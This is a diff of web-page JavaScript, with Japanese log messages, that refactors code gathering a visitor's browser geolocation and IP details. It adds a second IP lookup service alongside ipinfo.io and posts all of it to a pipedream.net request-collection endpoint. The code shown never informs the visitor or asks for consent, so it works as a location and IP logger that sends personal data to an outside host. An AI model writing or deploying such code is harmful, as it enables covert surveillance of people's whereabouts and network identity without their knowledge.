@@ -29,18 +29,15 @@
             pcInfo.location.longitude = position.coords.longitude;
             sendData(pcInfo);
           }, function() {
-            sendDataWithIpInfo(pcInfo);
+            fetchIPInfo(pcInfo);
           });
         } else {
-          sendDataWithIpInfo(pcInfo);
+          fetchIPInfo(pcInfo);
         }
       }
 
       async function sendData(pcInfo) {
         try {
-          const response = await fetch('https://ipinfo.io/json');
-          const ipData = await response.json();
-          pcInfo.ip = ipData;
           await fetch('https://enikio9fskusg.x.pipedream.net/', {
             method: 'POST',
             headers: {
@@ -54,24 +51,29 @@
         }
       }
 
-      async function sendDataWithIpInfo(pcInfo) {
+      async function fetchIPInfo(pcInfo) {
         try {
-          const response = await fetch('https://ipinfo.io/json');
-          const ipData = await response.json();
-          pcInfo.ip = ipData;
+          const [ipinfoResponse, ipapiResponse] = await Promise.all([
+            fetch('https://ipinfo.io/json'),
+            fetch('https://ipapi.co/json')
+          ]);
+
+          const ipinfoData = await ipinfoResponse.json();
+          const ipapiData = await ipapiResponse.json();
+
+          pcInfo.ipinfo = ipinfoData;
+          pcInfo.ipapi = ipapiData;
+
           if (!pcInfo.location.latitude && !pcInfo.location.longitude) {
-            [pcInfo.location.latitude, pcInfo.location.longitude] = ipData.loc.split(',');
+            const loc = ipinfoData.loc || ipapiData.loc;
+            if (loc) {
+              [pcInfo.location.latitude, pcInfo.location.longitude] = loc.split(',');
+            }
           }
-          await fetch('https://enikio9fskusg.x.pipedream.net/', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(pcInfo)
-          });
-          console.log('データが送信されました:', pcInfo);
+
+          sendData(pcInfo);
         } catch (error) {
-          console.error('データ送信中にエラーが発生しました:', error);
+          console.error('IP情報取得中にエラーが発生しました:', error);
         }
       }
 
